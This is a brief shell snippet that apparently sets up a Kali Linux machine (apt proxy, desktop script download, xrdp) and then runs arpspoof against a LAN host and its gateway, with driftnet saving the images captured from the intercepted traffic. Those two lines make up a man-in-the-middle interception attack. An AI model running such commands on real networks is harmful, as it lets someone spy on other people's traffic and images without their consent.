```shell

sudo sed -i.bak 's|http.kali.org|nexus.cluster.com/repository/apt-proxy|g' /etc/apt/sources.list
wget https://gitlab.com/kalilinux/build-scripts/kali-wsl-chroot/-/raw/master/xfce4.sh
update-rc.d xrdp enable

arpspoof -i eth0 -t 192.168.2.30 -r 192.168.2.1
driftnet -i eth0 -b -a -d /volume2/media/ -m 100
```